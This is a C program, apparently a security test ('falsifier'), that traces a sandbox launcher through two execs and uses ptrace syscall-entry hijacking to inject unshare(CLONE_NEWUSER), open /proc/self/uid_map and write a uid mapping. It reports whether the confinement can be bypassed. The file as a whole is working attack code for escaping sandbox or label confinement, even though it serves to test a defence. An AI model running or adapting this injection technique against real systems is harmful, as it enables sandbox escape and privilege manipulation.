// H0.1S ptrace falsifier (deterministic v2): unconfined tracer attaches
// BEFORE the entry exec, traces through both execs, and at the second exec
// injects unshare(CLONE_NEWUSER) + openat(/proc/self/uid_map) + write via
// syscall-entry hijacking (pending-based collection, no reliance on
// orig_rax semantics at exit stops).
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

#define CLONE_NEWUSER 0x10000000
#define ENOSYS_NUM (-38L)

enum { S_UNSHARE, S_OPEN, S_WRITE, S_DONE };

static int step = S_UNSHARE;
static int pending = 0;
static long open_fd = -1;
static long results[3];

static void read_label(pid_t pid, char *buf, size_t len) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/attr/current", pid);
    FILE *f = fopen(path, "r");
    if (!f) {
        snprintf(buf, len, "<unreadable>");
        return;
    }
    if (!fgets(buf, (int)len, f)) snprintf(buf, len, "<empty>");
    fclose(f);
    size_t n = strlen(buf);
    while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == ' ')) buf[--n] = 0;
}

static long poke_string(pid_t pid, unsigned long rsp, const char *text) {
    unsigned long base = (rsp & ~0xfffUL) - 0x2000;
    long words = (strlen(text) + 7) / 8;
    for (long i = 0; i < words; i++) {
        long word = 0;
        for (int b = 0; b < 8; b++) {
            int idx = (int)(i * 8 + b);
            word |= (idx < (int)strlen(text) ? (long)(unsigned char)text[idx] : 0L) << (8 * b);
        }
        if (ptrace(PTRACE_POKEDATA, pid, base + i * 8, (void *)word) == -1) return 0;
    }
    return base;
}

static void inject(pid_t pid, struct user_regs_struct *regs) {
    switch (step) {
    case S_UNSHARE:
        regs->orig_rax = SYS_unshare;
        regs->rax = ENOSYS_NUM;
        regs->rdi = CLONE_NEWUSER;
        regs->rsi = 0;
        regs->rdx = 0;
        regs->r10 = 0;
        break;
    case S_OPEN:
        regs->orig_rax = SYS_openat;
        regs->rax = ENOSYS_NUM;
        regs->rdi = AT_FDCWD;
        regs->rsi = poke_string(pid, (unsigned long)regs->rsp, "/proc/self/uid_map");
        regs->rdx = O_WRONLY;
        regs->r10 = 0;
        break;
    case S_WRITE:
        regs->orig_rax = SYS_write;
        regs->rax = ENOSYS_NUM;
        regs->rdi = open_fd;
        regs->rsi = poke_string(pid, (unsigned long)regs->rsp, "0 1000 1\n");
        regs->rdx = 9;
        regs->r10 = 0;
        break;
    default:
        break;
    }
}

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "usage: ptrace-attacker <entry-args...>\n");
        return 2;
    }
    setvbuf(stdout, NULL, _IONBF, 0);
    pid_t pid = fork();
    if (pid == 0) {
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) _exit(127);
        raise(SIGSTOP);
        execv(argv[1], &argv[1]);
        _exit(127);
    }
    int status;
    int saw_exec1 = 0, saw_exec2 = 0, saw_first_real = 0;
    long tracer_uid_map = -2; // -2 = not reached
    char label[256];
    for (;;) {
        if (waitpid(pid, &status, 0) == -1) {
            perror("waitpid");
            break;
        }
        if (WIFEXITED(status) || WIFSIGNALED(status)) {
            printf("tracee exited (status=%d)\n", WIFEXITED(status) ? WEXITSTATUS(status) : -1);
            break;
        }
        if (!WIFSTOPPED(status)) continue;
        int sig = WSTOPSIG(status);
        if (!saw_exec1) {
            saw_exec1 = 1;
            ptrace(PTRACE_SETOPTIONS, pid, 0, (void *)(PTRACE_O_TRACEEXEC | PTRACE_O_EXITKILL));
            read_label(pid, label, sizeof(label));
            printf("exec1 (entry) label: %s\n", label);
            ptrace(PTRACE_SYSCALL, pid, 0, 0);
            continue;
        }
        if ((status >> 16) == PTRACE_EVENT_EXEC) {
            saw_exec2 = 1;
            read_label(pid, label, sizeof(label));
            printf("exec2 (bwrap-real) label: %s\n", label);
            ptrace(PTRACE_SYSCALL, pid, 0, 0);
            continue;
        }
        if (saw_exec2 && sig == SIGTRAP) {
            struct user_regs_struct regs;
            ptrace(PTRACE_GETREGS, pid, 0, &regs);
            if (pending) {
                // exit of the injected syscall
                results[step] = (long)regs.rax;
                if (step == S_UNSHARE) {
                    printf("injected unshare -> %ld\n", (long)regs.rax);
                    read_label(pid, label, sizeof(label));
                    printf("label after unshare: %s\n", label);
                } else if (step == S_OPEN) {
                    open_fd = (long)regs.rax;
                    printf("injected openat(uid_map) -> %ld\n", (long)regs.rax);
                } else if (step == S_WRITE) {
                    printf("injected write(uid_map) -> %ld\n", (long)regs.rax);
                    tracer_uid_map = (long)regs.rax;
                    read_label(pid, label, sizeof(label));
                    printf("label after write: %s\n", label);
                    ptrace(PTRACE_KILL, pid, 0, 0);
                    waitpid(pid, &status, 0);
                    printf("PTRACE_ATTACK_RESULT: uid_map_write=%ld\n", tracer_uid_map);
                    return 0;
                }
                step++;
                pending = 0;
                ptrace(PTRACE_SYSCALL, pid, 0, 0);
                continue;
            }
            if (!saw_first_real && (long)regs.orig_rax == SYS_execve && (long)regs.rax == 0) {
                // trailing execve exit stop; skip
                ptrace(PTRACE_SYSCALL, pid, 0, 0);
                continue;
            }
            saw_first_real = 1;
            inject(pid, &regs);
            ptrace(PTRACE_SETREGS, pid, 0, &regs);
            pending = 1;
            ptrace(PTRACE_SYSCALL, pid, 0, 0);
            continue;
        }
        ptrace(PTRACE_SYSCALL, pid, 0, 0);
    }
    printf("PTRACE_ATTACK_RESULT: uid_map_write=%ld (tracee ended before completion)\n", tracer_uid_map);
    return 1;
}
